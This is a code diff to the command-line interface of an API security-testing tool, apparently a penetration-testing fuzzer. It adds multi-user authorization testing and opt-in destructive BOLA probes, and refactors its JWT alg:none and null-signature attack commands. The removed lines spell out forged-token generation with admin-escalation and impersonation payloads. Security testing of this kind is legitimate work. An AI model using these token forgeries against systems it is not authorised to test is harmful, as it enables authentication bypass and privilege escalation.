@@ -17,8 +17,11 @@ from typing import Optional
 
 from core import APILeakCore, ConfigurationManager, setup_logging
 from core import __version__ as APILEAK_VERSION
+from core.config import AuthContext, AuthType
 from core.logging import get_logger
-from utils.jwt_utils import decode_jwt, encode_jwt, print_jwt_info
+from utils.jwt_utils import decode_jwt, encode_jwt, print_jwt_info, verify_hmac_secret
+from utils.jwt_attack_engine import JWTAttackEngine
+from utils.jwt_attack_models import AttackType
 from utils.discovery_session import (
     DiscoveryResult,
     DiscoverySession,
@@ -348,6 +351,53 @@ def parse_basic_auth(basic_auth):
     return (username, password)
 
 
+def parse_auth_context_option(values):
+    """Build one :class:`AuthContext` per ``--auth-context`` option value.
+
+    Format: ``user:token[:privilege]`` (Requirement 20.1).
+
+    - Each value is split on ``:`` with ``maxsplit=2`` so a token that itself
+      contains ``:`` (e.g. a JWT is dot-delimited, but bearer values may embed
+      colons) survives intact in the second segment.
+    - When a third ``:privilege`` segment is present, it sets the AuthContext
+      ``privilege_level`` (Requirement 20.3); otherwise the privilege defaults
+      to ``1``.
+    - A value that omits the ``:`` separator between user and token is rejected
+      with a descriptive :class:`click.BadParameter` BEFORE any request is
+      issued (Requirement 20.5).
+
+    Returns a ``List[AuthContext]`` — one context per supplied value
+    (Requirement 20.2). An empty/unspecified ``values`` yields an empty list so
+    the caller can preserve the existing single-``--jwt`` behavior
+    (Requirements 20.4, 26.2).
+    """
+    contexts = []
+    for value in values or ():
+        if ':' not in value:
+            raise click.BadParameter(
+                f"--auth-context must be in the form user:token[:privilege] "
+                f"(got {value!r}): missing ':' separator between user and token."
+            )
+        parts = value.split(':', 2)
+        name, token = parts[0], parts[1]
+        privilege_level = 1
+        if len(parts) == 3 and parts[2] != '':
+            try:
+                privilege_level = int(parts[2])
+            except ValueError:
+                raise click.BadParameter(
+                    f"--auth-context privilege suffix must be an integer "
+                    f"(got {parts[2]!r} in {value!r})."
+                )
+        contexts.append(AuthContext(
+            name=name,
+            type=AuthType.BEARER,
+            token=token,
+            privilege_level=privilege_level,
+        ))
+    return contexts
+
+
 def validate_basic_auth_options(basic_auth, jwt):
     """Validate ``--basic-auth`` against conflicts and malformed values.
 
@@ -549,7 +599,7 @@ APILeak v0.1.0 - Enterprise API Fuzzing Tool - by Cl0wnR3v
     click.echo(banner, color=True)
 
 
-def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", user_agent_config=None, output_filename=None, advanced_config=None, status_code_filter=None, ci_mode=False, fail_on="critical", safe_mode=False, extra_headers=None, basic_auth=None):
+def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", user_agent_config=None, output_filename=None, advanced_config=None, status_code_filter=None, ci_mode=False, fail_on="critical", safe_mode=False, extra_headers=None, basic_auth=None, bola_config=None):
     """Create an enhanced configuration with all advanced features integrated"""
     # Support environment variable overrides for CI/CD integration
     target_url = target_url or os.getenv('APILEAK_TARGET', '')
@@ -645,6 +695,33 @@ def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", use
         "bola", "auth", "property", "resource", "function_auth", "ssrf"
     ]
 
+    # OWASP testing section. Advanced BOLA hardening options (Requirement 34)
+    # are threaded into the owasp_testing.bola_testing sub-dict consumed by
+    # ConfigurationManager._build_owasp_config -> BOLAConfig(**bola_testing).
+    # When ``bola_config`` is None (no advanced BOLA CLI flags) the sub-dict is
+    # omitted entirely, so BOLAConfig resolves to its safe read-only defaults
+    # and existing behavior is preserved byte-for-byte (Requirements 34.3,
+    # 34.4). All boolean flags default to False (their dataclass defaults), and
+    # ``destructive_methods`` is only set when the operator explicitly supplies
+    # --bola-destructive-methods; otherwise the BOLAConfig default {PATCH, PUT}
+    # applies (Requirement 34.2).
+    owasp_testing = {
+        'enabled_modules': owasp_modules
+    }
+    if bola_config:
+        bola_testing = {
+            'allow_destructive': bola_config.get('allow_destructive', False),
+            'enable_composite': bola_config.get('enable_composite', False),
+            'enable_id_leakage': bola_config.get('enable_id_leakage', False),
+            'verb_tampering': bola_config.get('verb_tampering', False),
+            'parameter_pollution': bola_config.get('parameter_pollution', False),
+            'dry_run': bola_config.get('dry_run', False),
+        }
+        destructive_methods = bola_config.get('destructive_methods')
+        if destructive_methods:
+            bola_testing['destructive_methods'] = destructive_methods
+        owasp_testing['bola_testing'] = bola_testing
+
     config = {
         'target': {
             'base_url': target_url,
@@ -681,9 +758,6 @@ def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", use
             'max_requests': None,
             'concurrency': 50
         },
-        'owasp_testing': {
-            'enabled_modules': owasp_modules
-        },
         'authentication': {
             'contexts': [
                 {
@@ -713,6 +787,7 @@ def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", use
         'http_output': {
             'status_code_filter': status_code_filter
         },
+        'owasp_testing': owasp_testing,
         'ci_cd_integration': {
             'enabled': ci_mode,
             'fail_on_severity': fail_on,
@@ -2629,6 +2704,20 @@ def par(ctx, target, wordlist, output, log_level, log_file, json_logs, rate_limi
 @click.option('--user-agent-custom', help='Custom User-Agent string to use for all requests')
 @click.option('--user-agent-file', help='File containing User-Agent strings (one per line) for rotation')
 @click.option('--jwt', help='JWT token to use for authentication')
+@click.option('--auth-context', 'auth_context', multiple=True, metavar='user:token[:privilege]',
+              help='Authenticated identity supplied as user:token with an optional '
+                   ':privilege suffix. Repeatable: pass once per user to run multi-user '
+                   'authorization tests (e.g. --auth-context alice:eyJ...:1 '
+                   '--auth-context bob:eyJ...:1).')
+@click.option('--public-key', 'public_key', metavar='PATH_OR_PEM',
+              help='RSA public key material (PEM/DER path or inline PEM) used by the '
+                   'algorithm-confusion test to HMAC-sign with the real key bytes.')
+@click.option('--jwks-url', 'jwks_url', metavar='URL',
+              help='JWKS endpoint URL used to fetch RSA public key material for the '
+                   'algorithm-confusion test when no --public-key is supplied.')
+@click.option('--signing-secret', 'signing_secret', metavar='SECRET',
+              help='Known HMAC signing secret used to construct a validly-signed but '
+                   'expired token for the expired-token-acceptance test.')
 @click.option('--status-code', help='Show only HTTP requests with specific status codes (e.g., 200,404 or 200-300)')
 @click.option('--detect-framework', '--df', is_flag=True, help='Enable framework detection (FastAPI, Express, Django, Flask, etc.)')
 @click.option('--fuzz-versions', '--fv', is_flag=True, help='Enable API version fuzzing (/v1, /v2, /api/v1, etc.)')
@@ -2655,8 +2744,27 @@ def par(ctx, target, wordlist, output, log_level, log_file, json_logs, rate_limi
               help='Restrict recursion to endpoints whose type is in TYPES: a comma-separated '
                    "list of endpoint types like 'admin,api_version'. Only narrows the default "
                    'recursion; never relaxes it.')
+@click.option('--allow-write-bola', 'allow_write_bola', is_flag=True, default=False,
+              help='Destructive_Opt_In: authorize the BOLA module to issue destructive '
+                   '(state-changing) probes. Off by default; when omitted the BOLA module '
+                   'issues only safe-method probes (read-only).')
+@click.option('--bola-destructive-methods', 'bola_destructive_methods', metavar='METHODS', default=None,
+              help='Comma-separated HTTP methods treated as destructive when '
+                   '--allow-write-bola is set (e.g. PATCH,PUT,DELETE). Values are '
+                   'uppercased. Defaults to PATCH,PUT (DELETE excluded) when omitted.')
+@click.option('--bola-composite', 'bola_composite', is_flag=True, default=False,
+              help='Enable the composite-key BOLA probe (off by default).')
+@click.option('--bola-id-leakage', 'bola_id_leakage', is_flag=True, default=False,
+              help='Enable the object-identifier leakage BOLA probe (off by default).')
+@click.option('--bola-verb-tampering', 'bola_verb_tampering', is_flag=True, default=False,
+              help='Enable the HTTP verb-tampering BOLA technique (off by default).')
+@click.option('--bola-parameter-pollution', 'bola_parameter_pollution', is_flag=True, default=False,
+              help='Enable the HTTP parameter-pollution BOLA technique (off by default).')
+@click.option('--bola-dry-run', 'bola_dry_run', is_flag=True, default=False,
+              help='Plan destructive BOLA probes (method, URL, substituted id, body) '
+                   'without issuing them (off by default).')
 @click.pass_context
-def full(ctx, config, target, output, log_level, log_file, json_logs, modules, rate_limit, depth, recursive, max_requests, concurrency, timeout, retries, extensions, user_agent_random, user_agent_custom, user_agent_file, jwt, status_code, detect_framework, fuzz_versions, framework_confidence, version_patterns, enable_advanced, enable_payload_encoding, enable_waf_evasion, enable_subdomain_discovery, enable_cors_analysis, ci_mode, fail_on, sarif, safe_mode, baseline, proxy, proxy_verify_ssl, recursion_status, recursion_type):
+def full(ctx, config, target, output, log_level, log_file, json_logs, modules, rate_limit, depth, recursive, max_requests, concurrency, timeout, retries, extensions, user_agent_random, user_agent_custom, user_agent_file, jwt, auth_context, public_key, jwks_url, signing_secret, status_code, detect_framework, fuzz_versions, framework_confidence, version_patterns, enable_advanced, enable_payload_encoding, enable_waf_evasion, enable_subdomain_discovery, enable_cors_analysis, ci_mode, fail_on, sarif, safe_mode, baseline, proxy, proxy_verify_ssl, recursion_status, recursion_type, allow_write_bola, bola_destructive_methods, bola_composite, bola_id_leakage, bola_verb_tampering, bola_parameter_pollution, bola_dry_run):
     """Full comprehensive scan - includes fuzzing and OWASP testing
     
     \b
@@ -2676,7 +2784,14 @@ def full(ctx, config, target, output, log_level, log_file, json_logs, modules, r
     logger = get_logger("full")
     
     logger.info("APILeak full scan starting", version="0.1.0", ci_mode=ci_mode)
-    
+
+    # Parse the repeatable --auth-context option up front so a value missing the
+    # ':' separator is rejected with a descriptive click.BadParameter BEFORE any
+    # discovery or request is issued (Requirement 20.5). An empty option yields
+    # an empty list, preserving the existing single-`--jwt` behavior
+    # (Requirements 20.4, 26.2).
+    parsed_auth_contexts = parse_auth_context_option(auth_context)
+
     # Parse the Recursion_Scope up front so an unrecognized status class or
     # endpoint type is surfaced as a descriptive CLI error naming the offending
     # value and NO Endpoint_Discovery is performed (Requirements 34.1, 34.2,
@@ -2732,8 +2847,32 @@ def full(ctx, config, target, output, log_level, log_file, json_logs, modules, r
             
             # Parse status code filter for HTTP output
             status_code_filter = parse_status_codes(status_code) if status_code else None
-            
-            config_dict = create_enhanced_config(target, None, "full", user_agent_config, output_filename, advanced_config, status_code_filter, ci_mode, fail_on, safe_mode)
+
+            # Assemble advanced BOLA hardening options (Requirement 34) from the
+            # CLI flags so they populate the constructed BOLAConfig via
+            # create_enhanced_config -> owasp_testing.bola_testing. All boolean
+            # flags default to off (False); --bola-destructive-methods is parsed
+            # from a comma-separated string into an uppercased set and is only
+            # threaded when supplied so the BOLAConfig default {PATCH, PUT}
+            # otherwise applies (Requirements 34.3, 34.4).
+            destructive_methods_set = None
+            if bola_destructive_methods:
+                destructive_methods_set = {
+                    m.strip().upper()
+                    for m in bola_destructive_methods.split(',')
+                    if m.strip()
+                }
+            bola_config = {
+                'allow_destructive': allow_write_bola,
+                'destructive_methods': destructive_methods_set,
+                'enable_composite': bola_composite,
+                'enable_id_leakage': bola_id_leakage,
+                'verb_tampering': bola_verb_tampering,
+                'parameter_pollution': bola_parameter_pollution,
+                'dry_run': bola_dry_run,
+            }
+
+            config_dict = create_enhanced_config(target, None, "full", user_agent_config, output_filename, advanced_config, status_code_filter, ci_mode, fail_on, safe_mode, bola_config=bola_config)
             # Thread discovery recursion / budget / concurrency controls into the
             # fuzzing config (Requirements 17, 18, 20).
             config_dict['fuzzing']['max_depth'] = resolve_max_depth(depth)
@@ -2785,7 +2924,36 @@ def full(ctx, config, target, output, log_level, log_file, json_logs, modules, r
         if sarif and hasattr(apileak_config, 'reporting'):
             if 'sarif' not in apileak_config.reporting.formats:
                 apileak_config.reporting.formats.append('sarif')
-        
+
+        # Thread the parsed multi-user Auth_Contexts into the authentication
+        # config so all of them are passed to the OWASP modules (Requirements
+        # 20.1, 20.2). Each supplied --auth-context becomes one AuthContext with
+        # its privilege_level set from the optional :privilege suffix (Req 20.3).
+        # The contexts are appended to the existing anonymous context so
+        # discovery and the single-`--jwt` behavior are preserved (Reqs 20.4,
+        # 26.2). Applied post-load so it works for both file and in-memory
+        # configs.
+        if parsed_auth_contexts and hasattr(apileak_config, 'authentication'):
+            apileak_config.authentication.contexts.extend(parsed_auth_contexts)
+            logger.info(
+                "Threaded multi-user auth contexts into OWASP modules",
+                context_count=len(parsed_auth_contexts),
+            )
+
+        # Thread the algorithm-confusion / expired-token key inputs into the
+        # AuthTestingConfig so the Auth_Module can source real key material
+        # instead of literal placeholders (Requirements 6.1, 6.2, 8.1). The CLI
+        # flags override any file-config values when supplied.
+        if hasattr(apileak_config, 'owasp_testing') and hasattr(
+                apileak_config.owasp_testing, 'auth_testing'):
+            auth_testing_cfg = apileak_config.owasp_testing.auth_testing
+            if public_key:
+                auth_testing_cfg.public_key_material = public_key
+            if jwks_url:
+                auth_testing_cfg.jwks_url = jwks_url
+            if signing_secret:
+                auth_testing_cfg.signing_secret = signing_secret
+
         # Apply CLI overrides
         cli_overrides = {}
         if target:
@@ -2815,6 +2983,135 @@ def full(ctx, config, target, output, log_level, log_file, json_logs, modules, r
         logger.error("Full scan failed", error=str(e))
         click.echo(f"Error: {e}", err=True)
         sys.exit(1)
+
+
+# ---------------------------------------------------------------------------
+# JWT CLI helpers — route all attack-token generation and execution through the
+# single-source-of-truth JWTAttackEngine (Requirements 14.2, 14.3) and issue
+# HTTP through the shared HTTPRequestEngine (Requirement 17.1). No subcommand
+# reimplements attack logic inline, and success is decided by the engine's
+# JWTAttackResponseAnalyzer rather than admin/dashboard keyword presence
+# (Requirement 19.2).
+# ---------------------------------------------------------------------------
+
+def _parse_custom_headers(header):
+    """Parse repeatable ``Name: Value`` header options into a dict.
+
+    Exits with an error on a malformed header, matching prior CLI behavior.
+    """
+    custom_headers = {}
+    for h in header:
+        if ':' not in h:
+            click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
+            sys.exit(1)
+        name, value = h.split(':', 1)
+        custom_headers[name.strip()] = value.strip()
+    return custom_headers
+
+
+def _build_jwt_http_engine(timeout=30, verify_ssl=True):
+    """Build a shared :class:`HTTPRequestEngine` for JWT attack requests.
+
+    Routing JWT HTTP through the shared engine applies the same rate limiting,
+    proxy, User-Agent rotation, and TLS controls as the rest of the tool
+    (Requirement 17.1).
+    """
+    from utils.http_client import HTTPRequestEngine, RateLimiter, RetryConfig
+    from core.config import RateLimitConfig
+
+    rate_limiter = RateLimiter(RateLimitConfig())
+    retry_config = RetryConfig(max_attempts=3)
+    return HTTPRequestEngine(
+        rate_limiter, retry_config, timeout=timeout, verify_ssl=verify_ssl)
+
+
+def _make_jwt_engine(token, url, custom_headers, data, http_engine=None,
+                     signing_secret=None):
+    """Construct a :class:`JWTAttackEngine` for a CLI subcommand."""
+    return JWTAttackEngine(
+        target_url=url or "",
+        original_token=token,
+        http_engine=http_engine,
+        signing_secret=signing_secret,
+        custom_headers=custom_headers or {},
+        post_data=data,
+    )
+
+
+def _display_generated_tokens(engine, attack_type):
+    """Generate and print attack tokens for ``attack_type`` via the engine."""
+    tokens = engine.generate_token(attack_type)
+    click.echo(f"\n🎯 Generated {len(tokens)} attack token(s) via JWTAttackEngine:")
+    click.echo("-" * 55)
+    for i, tok in enumerate(tokens, 1):
+        click.echo(f"\n{i}. {tok}")
+    return tokens
+
+
+def _report_attack_result(result):
+    """Report a single :class:`AttackResult` using the analyzer's assessment.
+
+    Success is determined by the engine's :class:`JWTAttackResponseAnalyzer`
+    (baseline comparison + confidence scoring), never by keyword presence
+    (Requirements 19.1, 19.2).
+    """
+    if result is None:
+        click.echo("   ⚠️  No response obtained from the endpoint for this vector")
+        return False
+
+    assessment = result.vulnerability_assessment
+    response = result.response_details
+    click.echo(f"\n🧪 {result.attack_type.value}:")
+    click.echo(f"   Status: {response.status_code}")
+    click.echo(f"   Length: {response.content_length} bytes")
+    click.echo(f"   Confidence: {assessment.confidence_score:.2f}")
+    if result.baseline_comparison:
+        bc = result.baseline_comparison
+        click.echo(
+            f"   Baseline: {bc.get('baseline_status')} -> {bc.get('attack_status')} "
+            f"(len Δ {bc.get('content_length_diff')})")
+
+    if assessment.is_vulnerable:
+        click.echo(f"   🚨 VULNERABILITY CONFIRMED: {assessment.vulnerability_type} "
+                   f"({assessment.severity.value})")
+        for ev in assessment.evidence:
+            click.echo(f"   💀 {ev}")
+        return True
+
+    click.echo("   ✅ Attack blocked - server rejected the malicious token")
+    return False
+
+
+def _run_jwt_vector(token, attack_type, url, custom_headers, data, timeout,
+                    verify_ssl=True, signing_secret=None):
+    """Drive one JWT attack vector through the engine.
+
+    When ``url`` is provided the vector is executed against the endpoint through
+    the shared :class:`HTTPRequestEngine` and evaluated by the engine's response
+    analyzer; otherwise the generated tokens are displayed for manual testing.
+    """
+    if not url:
+        engine = _make_jwt_engine(token, url, custom_headers, data)
+        _display_generated_tokens(engine, attack_type)
+        click.echo(f"\n⚠️  Manual Testing Required (no --url provided):")
+        click.echo("• Test each generated token against your API endpoints")
+        click.echo("• If a token is accepted, the server is vulnerable to this attack")
+        return
+
+    async def _run():
+        http_engine = _build_jwt_http_engine(timeout, verify_ssl)
+        try:
+            engine = _make_jwt_engine(
+                token, url, custom_headers, data,
+                http_engine=http_engine, signing_secret=signing_secret)
+            _display_generated_tokens(engine, attack_type)
+            click.echo(f"\n🎯 Testing against endpoint: {url}")
+            result = await engine.execute_attack(attack_type)
+            _report_attack_result(result)
+        finally:
+            await http_engine.close()
+
+    asyncio.run(_run())
 
 
 # JWT Command Group
@@ -2982,166 +3279,38 @@ def jwt_test_alg_none(ctx, token, payload, url, header, data, timeout):
         click.echo("="*45)
         click.echo("🔥 SEVERITY: CRITICAL - Authentication Completely Nullified")
         click.echo("")
-        
-        # Parse custom headers
-        custom_headers = {}
-        for h in header:
-            if ':' not in h:
-                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
-                sys.exit(1)
-            name, value = h.split(':', 1)
-            custom_headers[name.strip()] = value.strip()
-        
-        # Decode original token
+
+        custom_headers = _parse_custom_headers(header)
+
+        # Decode original token for display
         decoded = decode_jwt(token)
         click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
         click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
         click.echo("")
-        
-        # 1️⃣ & 2️⃣ Create alg:none version with no signature
-        click.echo("1️⃣ Rewriting header algorithm to 'none'...")
-        new_header = {"alg": "none", "typ": "JWT"}
-        
-        # 3️⃣ Create malicious payloads
-        click.echo("3️⃣ Creating malicious payloads...")
-        
-        attack_payloads = []
-        
-        # Use custom payload if provided
+
+        # Route generation + execution through the single-source-of-truth engine
+        # (Requirements 14.2, 14.3, 17.1, 19.2). If a custom payload is supplied
+        # it is merged onto the base token before running the vector.
+        base_token = token
         if payload:
             try:
                 custom_payload = json.loads(payload)
-                attack_payloads.append(("Custom Payload", custom_payload))
             except json.JSONDecodeError:
                 click.echo(f"❌ Invalid JSON payload: {payload}")
                 return
-        
-        # Create privilege escalation payloads
-        original_payload = copy.deepcopy(decoded['payload'])
-        
-        # Admin privilege escalation
-        admin_payload = copy.deepcopy(original_payload)
-        admin_payload.update({
-            'sub': 'admin',
-            'role': 'admin', 
-            'admin': True,
-            'is_admin': True,
-            'scope': 'admin read write delete',
-            'privileges': ['admin', 'superuser']
-        })
-        attack_payloads.append(("Admin Privilege Escalation", admin_payload))
-        
-        # User impersonation
-        if 'sub' in original_payload and original_payload['sub'] != 'admin':
-            impersonation_payload = copy.deepcopy(original_payload)
-            impersonation_payload['sub'] = 'admin'
-            impersonation_payload['username'] = 'admin'
-            impersonation_payload['user_id'] = '1'
-            attack_payloads.append(("User Impersonation", impersonation_payload))
-        
-        # Extended expiration
-        if 'exp' in original_payload:
-            import time
-            extended_payload = copy.deepcopy(original_payload)
-            extended_payload['exp'] = int(time.time()) + (365 * 24 * 60 * 60)  # 1 year
-            attack_payloads.append(("Extended Expiration", extended_payload))
-        
-        # Generate attack tokens
-        attack_tokens = []
-        import base64
-        
-        for attack_name, attack_payload in attack_payloads:
-            # 4️⃣ Create unsigned token (alg:none)
-            header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
-            payload_b64 = base64.urlsafe_b64encode(json.dumps(attack_payload).encode()).decode().rstrip('=')
-            
-            # alg:none tokens should have empty signature
-            unsigned_token = f"{header_b64}.{payload_b64}."
-            attack_tokens.append((attack_name, unsigned_token, attack_payload))
-            
-            click.echo(f"✅ Generated {attack_name} token")
-        
-        # Display generated tokens
-        click.echo(f"\n🎯 Generated alg:none Attack Tokens:")
-        click.echo("-" * 50)
-        for i, (name, token_val, payload_info) in enumerate(attack_tokens, 1):
-            click.echo(f"\n{i}. {name}:")
-            click.echo(f"   Token: {token_val}")
-            click.echo(f"   Payload: {json.dumps(payload_info)}")
-        
-        # 5️⃣ Test against real endpoint if URL provided
-        if url and attack_tokens:
-            click.echo(f"\n5️⃣ Testing privileged access against real endpoint...")
-            click.echo(f"🎯 Target: {url}")
-            
-            import asyncio
-            import httpx
-            
-            async def test_endpoint(token_name, token_value, payload_info):
-                try:
-                    headers = {'Authorization': f'Bearer {token_value}'}
-                    headers.update(custom_headers)
-                    
-                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
-                        if data:
-                            response = await client.post(url, headers=headers, data=data)
-                        else:
-                            response = await client.get(url, headers=headers)
-                        
-                        click.echo(f"\n🧪 {token_name} Test:")
-                        click.echo(f"   Status: {response.status_code}")
-                        click.echo(f"   Length: {len(response.text)} bytes")
-                        
-                        # Check for success indicators
-                        success_indicators = []
-                        if response.status_code in [200, 201, 202]:
-                            success_indicators.append("2xx Success Status")
-                        
-                        response_text = response.text.lower()
-                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged', 'welcome']):
-                            success_indicators.append("Privileged Content Detected")
-                        
-                        if 'error' not in response_text and 'unauthorized' not in response_text and 'forbidden' not in response_text:
-                            success_indicators.append("No Error Messages")
-                        
-                        if success_indicators:
-                            click.echo(f"   🚨 CRITICAL VULNERABILITY CONFIRMED!")
-                            click.echo(f"   💀 Evidence: {', '.join(success_indicators)}")
-                            click.echo(f"   💀 Server accepted unsigned token!")
-                            click.echo(f"   💀 Payload used: {json.dumps(payload_info)}")
-                        else:
-                            click.echo(f"   ✅ Attack blocked - server properly rejects alg:none")
-                            
-                except Exception as e:
-                    click.echo(f"   ❌ Request failed: {e}")
-            
-            # Test all attack tokens
-            async def run_all_tests():
-                for token_name, token_value, payload_info in attack_tokens:
-                    await test_endpoint(token_name, token_value, payload_info)
-            
-            asyncio.run(run_all_tests())
-        
-        else:
-            click.echo(f"\n⚠️  Manual Testing Required:")
-            click.echo("• Test each token against your API endpoints")
-            click.echo("• If ANY token is accepted, the server is CRITICALLY vulnerable")
-            click.echo("• Proper JWT libraries should REJECT all alg:none tokens")
-        
-        # Summary and recommendations
-        click.echo(f"\n" + "="*60)
-        click.echo("🔥 ATTACK SUMMARY")
-        click.echo("="*60)
-        click.echo(f"✅ Attack tokens generated: {len(attack_tokens)}")
-        if url:
-            click.echo(f"✅ Endpoint testing completed")
-        
+            merged = copy.deepcopy(decoded['payload'])
+            merged.update(custom_payload)
+            base_token = encode_jwt(decoded['header'], merged, 'secret')
+
+        _run_jwt_vector(base_token, AttackType.ALG_NONE, url, custom_headers,
+                        data, timeout)
+
         click.echo(f"\n💡 REMEDIATION:")
         click.echo("• Configure JWT library to REJECT alg:none tokens")
         click.echo("• Implement algorithm whitelist (e.g., only allow HS256, RS256)")
         click.echo("• Never trust the algorithm specified in JWT header")
         click.echo("• Use proper JWT validation libraries, not custom implementations")
-        
+
     except Exception as e:
         click.echo(f"❌ Error: {e}", err=True)
         sys.exit(1)
@@ -3183,170 +3352,38 @@ def jwt_test_null_signature(ctx, token, payload, url, header, data, timeout):
         click.echo("="*40)
         click.echo("🔥 SEVERITY: CRITICAL - Cryptographic Validation Bypass")
         click.echo("")
-        
-        # Parse custom headers
-        custom_headers = {}
-        for h in header:
-            if ':' not in h:
-                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
-                sys.exit(1)
-            name, value = h.split(':', 1)
-            custom_headers[name.strip()] = value.strip()
-        
-        # Decode original token
+
+        custom_headers = _parse_custom_headers(header)
+
+        # Decode original token for display
         decoded = decode_jwt(token)
         click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
         click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
         click.echo("")
-        
-        # 2️⃣ Create malicious payloads
-        click.echo("2️⃣ Creating malicious payloads...")
-        
-        attack_payloads = []
-        
-        # Use custom payload if provided
+
+        # Route generation + execution through the single-source-of-truth engine
+        # (Requirements 14.2, 14.3, 17.1, 19.2). A custom payload is merged onto
+        # the base token before running the vector.
+        base_token = token
         if payload:
             try:
                 custom_payload = json.loads(payload)
-                attack_payloads.append(("Custom Payload", custom_payload))
             except json.JSONDecodeError:
                 click.echo(f"❌ Invalid JSON payload: {payload}")
                 return
-        
-        # Create privilege escalation payloads
-        original_payload = copy.deepcopy(decoded['payload'])
-        
-        # Admin privilege escalation
-        admin_payload = copy.deepcopy(original_payload)
-        admin_payload.update({
-            'sub': 'admin',
-            'role': 'admin', 
-            'admin': True,
-            'is_admin': True,
-            'scope': 'admin read write delete',
-            'privileges': ['admin', 'superuser']
-        })
-        attack_payloads.append(("Admin Privilege Escalation", admin_payload))
-        
-        # User impersonation
-        if 'sub' in original_payload and original_payload['sub'] != 'admin':
-            impersonation_payload = copy.deepcopy(original_payload)
-            impersonation_payload['sub'] = 'admin'
-            impersonation_payload['username'] = 'admin'
-            impersonation_payload['user_id'] = '1'
-            attack_payloads.append(("User Impersonation", impersonation_payload))
-        
-        # Extended expiration
-        if 'exp' in original_payload:
-            import time
-            extended_payload = copy.deepcopy(original_payload)
-            extended_payload['exp'] = int(time.time()) + (365 * 24 * 60 * 60)  # 1 year
-            attack_payloads.append(("Extended Expiration", extended_payload))
-        
-        # 1️⃣ Create tokens with different null signature variations
-        click.echo("1️⃣ Creating null signature variants...")
-        
-        attack_tokens = []
-        import base64
-        
-        for attack_name, attack_payload in attack_payloads:
-            header_b64 = base64.urlsafe_b64encode(json.dumps(decoded['header']).encode()).decode().rstrip('=')
-            payload_b64 = base64.urlsafe_b64encode(json.dumps(attack_payload).encode()).decode().rstrip('=')
-            
-            # Create different null signature variations
-            variations = [
-                (f"{attack_name} - Empty Signature", f"{header_b64}.{payload_b64}."),
-                (f"{attack_name} - No Signature Section", f"{header_b64}.{payload_b64}"),
-                (f"{attack_name} - Literal Null", f"{header_b64}.{payload_b64}.null"),
-                (f"{attack_name} - Empty Object", f"{header_b64}.{payload_b64}." + "{}"),
-                (f"{attack_name} - Zero Signature", f"{header_b64}.{payload_b64}.0"),
-            ]
-            
-            for variant_name, variant_token in variations:
-                attack_tokens.append((variant_name, variant_token, attack_payload))
-        
-        click.echo(f"✅ Generated {len(attack_tokens)} null signature variants")
-        
-        # Display generated tokens
-        click.echo(f"\n🎯 Generated Null Signature Attack Tokens:")
-        click.echo("-" * 55)
-        for i, (name, token_val, payload_info) in enumerate(attack_tokens, 1):
-            click.echo(f"\n{i}. {name}")
-            click.echo(f"   Token: {token_val}")
-        
-        # 3️⃣ & 4️⃣ Test against real endpoint if URL provided
-        if url and attack_tokens:
-            click.echo(f"\n3️⃣ Testing against protected endpoint...")
-            click.echo(f"🎯 Target: {url}")
-            
-            import asyncio
-            import httpx
-            
-            async def test_endpoint(token_name, token_value, payload_info):
-                try:
-                    headers = {'Authorization': f'Bearer {token_value}'}
-                    headers.update(custom_headers)
-                    
-                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
-                        if data:
-                            response = await client.post(url, headers=headers, data=data)
-                        else:
-                            response = await client.get(url, headers=headers)
-                        
-                        click.echo(f"\n🧪 {token_name}:")
-                        click.echo(f"   Status: {response.status_code}")
-                        click.echo(f"   Length: {len(response.text)} bytes")
-                        
-                        # Check for success indicators
-                        success_indicators = []
-                        if response.status_code in [200, 201, 202]:
-                            success_indicators.append("2xx Success Status")
-                        
-                        response_text = response.text.lower()
-                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged', 'welcome']):
-                            success_indicators.append("Privileged Content Detected")
-                        
-                        if 'error' not in response_text and 'unauthorized' not in response_text and 'forbidden' not in response_text:
-                            success_indicators.append("No Error Messages")
-                        
-                        if success_indicators:
-                            click.echo(f"   🚨 CRITICAL VULNERABILITY CONFIRMED!")
-                            click.echo(f"   💀 Evidence: {', '.join(success_indicators)}")
-                            click.echo(f"   💀 Server accepted token with null signature!")
-                            click.echo(f"   💀 Payload used: {json.dumps(payload_info)}")
-                        else:
-                            click.echo(f"   ✅ Attack blocked - server properly validates signatures")
-                            
-                except Exception as e:
-                    click.echo(f"   ❌ Request failed: {e}")
-            
-            # Test all attack tokens
-            async def run_all_tests():
-                for token_name, token_value, payload_info in attack_tokens:
-                    await test_endpoint(token_name, token_value, payload_info)
-            
-            asyncio.run(run_all_tests())
-        
-        else:
-            click.echo(f"\n⚠️  Manual Testing Required:")
-            click.echo("• Test each variant against your API")
-            click.echo("• If ANY variant is accepted, signature verification is bypassed")
-            click.echo("• Proper implementation should reject ALL null signature variants")
-        
-        # Summary and recommendations
-        click.echo(f"\n" + "="*60)
-        click.echo("🔥 ATTACK SUMMARY")
-        click.echo("="*60)
-        click.echo(f"✅ Attack variants generated: {len(attack_tokens)}")
-        if url:
-            click.echo(f"✅ Endpoint testing completed")
-        
+            merged = copy.deepcopy(decoded['payload'])
+            merged.update(custom_payload)
+            base_token = encode_jwt(decoded['header'], merged, 'secret')
+
+        _run_jwt_vector(base_token, AttackType.NULL_SIGNATURE, url, custom_headers,
+                        data, timeout)
+
         click.echo(f"\n💡 REMEDIATION:")
         click.echo("• Implement proper signature validation - never accept empty signatures")
         click.echo("• Validate signature length and format before verification")
         click.echo("• Use established JWT libraries with proper validation")
         click.echo("• Implement signature presence checks before cryptographic verification")
-        
+
     except Exception as e:
         click.echo(f"❌ Error: {e}", err=True)
         sys.exit(1)
